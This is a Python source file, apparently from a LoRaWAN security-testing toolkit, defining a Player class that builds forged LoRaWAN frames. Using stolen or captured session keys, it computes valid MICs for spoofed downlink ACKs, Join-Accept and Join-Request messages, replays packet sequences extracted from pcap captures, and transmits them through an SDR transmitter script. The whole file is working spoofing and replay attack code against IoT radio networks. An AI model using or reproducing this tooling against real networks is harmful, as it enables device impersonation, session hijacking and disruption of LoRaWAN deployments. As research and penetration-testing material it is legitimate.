import json

from src.command_handler import CommandHandler
from src.session_manager import SessionManager, SessionParams
from src.crypto_tools import CryptoTool
from src.analyzer import Analyzer


class Player(CommandHandler):

    def __init__(self):
        self.TRANSMITTER_PATH = './sniffers/lora_transmitter.py'
        self.session_manager = SessionManager()
        self.crypto_tool = CryptoTool()
        self.analyzer = Analyzer()

    def __replay_message(self, message):
        with open('./config/transmitter.config', 'r') as file:
            parameters = json.load(file)
        sample_rate = parameters['sample_rate']
        bandwidth = parameters['bandwidth']
        frequency = str(parameters['frequency'])
        spreading_factor = str(parameters['spreading_factor'])
        gain = str(parameters['gain_db'])
        script_path = './sniffers/lora_transmitter.py'

        print('Playing: ' + message)

        command = ['python3', script_path, '--frequency', frequency, '--bandwidth', bandwidth, '--samp-rate',
                   sample_rate, '--spreading-factor', spreading_factor, '--gain-db', gain, '--message', message]
        self.execute_command(command)

    def spoof_ACK(self):
        MHDR = '60'  # unconfirmed data down
        DEV_ADDR = self.session_manager.get_session_value(SessionParams.JoinAccept_DevAddr)
        FCTRL = '20'
        FCNT = 'FFF0'  # placeholder, should be high enough to get accepted by the ED
        FRMPayload = MHDR + DEV_ADDR + FCTRL + FCNT
        if self.session_manager.get_session_value(SessionParams.NwkSKey) is None:
            print('Missing NwkSKey in session data')
            return
        MIC = self.crypto_tool.compute_MIC(bytes.fromhex(self.session_manager.get_session_value(SessionParams.NwkSKey)),
                                           bytes.fromhex(FRMPayload))

        payload = '183110' + FRMPayload + MIC  # preamble

        self.__replay_message(payload)

    def spoof_JoinAccept(self):
        # join accept structure
        # https://lora-developers.semtech.com/documentation/tech-papers-and-guides/lorawan-device-activation/device-activation/
        if self.session_manager.get_session_value(SessionParams.NwkKey) is None:
            print('Missing NwkKey')
            return

        PHY = '000000'
        MHDR = '20'
        JOIN_APP_NONCE = '111111'
        NET_ID = '000000'
        if self.session_manager.get_session_value(SessionParams.JoinAccept_NetID) is not None:
            NET_ID = self.session_manager.get_session_value(SessionParams.JoinAccept_NetID)
        DEV_ADDR = '33333333'
        if self.session_manager.get_session_value(SessionParams.JoinAccept_DevAddr) is not None:
            DEV_ADDR = self.session_manager.get_session_value(SessionParams.JoinAccept_DevAddr)
        OTHER = '0000'

        PAYLOAD = MHDR + JOIN_APP_NONCE + NET_ID + DEV_ADDR + OTHER

        PACKET = PHY + PAYLOAD + self.crypto_tool.compute_MIC(
            bytes.fromhex(self.session_manager.get_session_value(SessionParams.NwkKey)), bytes.fromhex(PAYLOAD))

        self.__replay_message(PACKET)
        # Join-accept	MHDR | JoinNonce | NetID | DevAddr | DLSettings | RxDelay | CFList

    def spoof_JoinRequest(self):
        # join accept structure
        # https://lora-developers.semtech.com/documentation/tech-papers-and-guides/lorawan-device-activation/device-activation/
        if self.session_manager.get_session_value(SessionParams.NwkKey) is None:
            print('Missing NwkKey')
            return

        PHY = '173180'
        MHDR = '00'
        JOIN_APP_EUI = '0000000000000000'
        if self.session_manager.get_session_value(SessionParams.JoinRequest_JoinEUI) is not None:
            JOIN_APP_EUI = self.session_manager.get_session_value(SessionParams.JoinRequest_JoinEUI)
        DEV_EUI = '3333333333333333'
        if self.session_manager.get_session_value(SessionParams.JoinRequest_DevEUI) is not None:
            DEV_EUI = self.session_manager.get_session_value(SessionParams.JoinRequest_DevEUI)
        DEV_NONCE = '1234'

        PAYLOAD = MHDR + JOIN_APP_EUI + DEV_EUI + DEV_NONCE
        MIC = self.crypto_tool.compute_MIC(bytes.fromhex(self.session_manager.get_session_value(SessionParams.NwkKey)), bytes.fromhex(PAYLOAD))

        PACKET = PHY + PAYLOAD + MIC

        self.__replay_message(PACKET)

    def replay_sequence_from_pcap(self, script_path):
        # TODO add support for multiple payloads
        payloads = self.analyzer.get_packet_sequence_from_pcap(script_path)
        for payload in payloads:
            self.__replay_message(payload)

    def configure_transmitter(self):
        config_path = './config/transmitter.config'
        command = ['gedit', config_path]
        self.execute_command(command)


if __name__ == "__main__":
    p = Player()
    p.spoof_JoinRequest()
